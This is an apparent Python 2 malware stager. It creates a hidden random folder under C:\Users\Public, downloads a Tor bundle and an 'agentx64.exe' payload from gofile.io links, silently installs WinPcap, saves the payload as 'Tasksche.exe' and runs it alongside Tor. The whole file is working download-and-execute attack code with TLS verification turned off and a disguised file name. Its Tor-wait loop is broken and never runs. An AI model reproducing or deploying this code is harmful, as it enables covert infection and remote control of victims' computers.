import os
import sys
import zipfile
import random
import string 
import urllib
import psutil
import requests
import shutil

from threading import Thread
from time import sleep
from pathlib import Path

DSTFOLDER = ''

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)

	
def mdown(url,dst):
    # M download
	r = requests.get(url, verify=False,stream=True)
	r.raw.decode_content = True
	with open(dst, 'wb') as f:
		shutil.copyfileobj(r.raw, f)  
		
		

def sttor(path_to_execute):
	os.system(path_to_execute)	

def wintest():
	paths = ["C:\\Program Files (x86)\\WinPcap\\rpcapd.exe","C:\\Program Files\\WinPcap\\rpcapd.exe"]
	
	for path in paths:
		my_file = Path(path)
		if my_file.is_file():
			print "[*] Found Occurence of Winpcap"
			return True
			
	return False
			
	
	
def stage1():
	# Agent Download
	global DSTFOLDER
	
	TORRUNNING = False
	
	# Gen Folder Name
	fname  = 'C:\\Users\\Public\\'
	fname += ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
	DSTFOLDER = fname 
	print "[*] Generating folder : " , DSTFOLDER
	
	# Gen File Name
	filename = '\\Tasksche.exe'
	print "[*] Generating filename : " , filename

	# Gen Folder 
	if not os.path.exists(fname):	
		print "[*] Creating folder ."
		os.makedirs(fname)
		
	#print "[*] Downloading TDMB64.exe ..."
	print "[*] Downloading Tor.zip 72 MB ..."

	mdown('https://srv-file1.gofile.io/download/jr0NmZ/7db34320a0c414892c0e1fced5b46931/Tor.zip', DSTFOLDER + "\\" + "Tor.zip")
	# https://gofile.io/?c=jr0NmZ
	
	
	print "[+] Downloaded."
	print "[*] Creating Extraction dir : " , DSTFOLDER + "\\RT64DMB"

	os.makedirs(DSTFOLDER + "\\RT64DMB")
	 
	print "[*] Extracting Tor.zip ..."

	zip_ref = zipfile.ZipFile(DSTFOLDER + "\\Tor.zip", 'r')
	zip_ref.extractall(DSTFOLDER + "\\RT64DMB")
	zip_ref.close()

	print "[+] Extracted everything"
	print "[*] Cleaning up .zip ..."
	
	os.remove(DSTFOLDER + "\\Tor.zip")
	
	print "[*] Downloading winpcap ..."
	# Replace URL with Agent URL
	mdown('https://github.com/boundary/winpcap-installer/archive/master.zip', DSTFOLDER + "\\" + "winpcap.zip")
	print "[+] Downloaded."
	print "[*] Creating Extraction dir : " , DSTFOLDER + "\\winpcap"

	os.makedirs(DSTFOLDER + "\\winpcap")
	 
	print "[*] Extracting winpcap.zip ..."

	zip_ref = zipfile.ZipFile(DSTFOLDER + "\\winpcap.zip", 'r')
	zip_ref.extractall(DSTFOLDER + "\\winpcap")
	zip_ref.close()

	print "[+] Extracted everything"
	print "[*] Cleaning up .zip ..."
	
	os.remove(DSTFOLDER + "\\winpcap.zip")
	
	print "[*] Renaiming Archive Installer to : Installer.exe ..."
	os.rename(DSTFOLDER + "\\winpcap\\winpcap-installer-master\\winpcap-truesight-meter-4.1.3.exe", DSTFOLDER + "\\winpcap\\winpcap-installer-master\\Installer.exe")
	print "[*] Starting winpcap installer ..."
	os.system(DSTFOLDER + "\\winpcap\winpcap-installer-master\\Installer.exe /S")
	
	print "[*] Checking for Winpcap Installation or Exits ..."
	
	if wintest() == False:
		sys.exit(0)
	
	print "[+] Winpcap Installed ."
	print "[*] Downloading .exe ..."
	# Replace URL with Agent URL
	mdown('https://srv-file1.gofile.io/download/9TSelc/7db34320a0c414892c0e1fced5b46931/agentx64.exe', DSTFOLDER + "\\" + filename)
	print "[+] Downloaded."
		
	path_to_execute = DSTFOLDER + "\\RT64DMB\\Browser\\TorBrowser\\Tor\\tor.exe --defaults-torrc \\torrc.default"
	
	print "[*] Executing tor.exe command : %s " % path_to_execute
	thread = Thread(target = sttor, args = (path_to_execute, ))
	thread.start()
	
	while TORRUNNING:
		for p in psutil.process_iter():
			try:
				if p.name() == 'tor.exe':
					print "[*] Tor.exe is running..."
					TORRUNNING = True
					break
			except psutil.Error:
				print "[*] Tor.exe not found ."
				sleep(2000)
	
	
	print "[*] Executing ... " , DSTFOLDER + "\\" + filename
	#Execute File
	os.system( DSTFOLDER + "\\" + filename)

	
	
stage1()

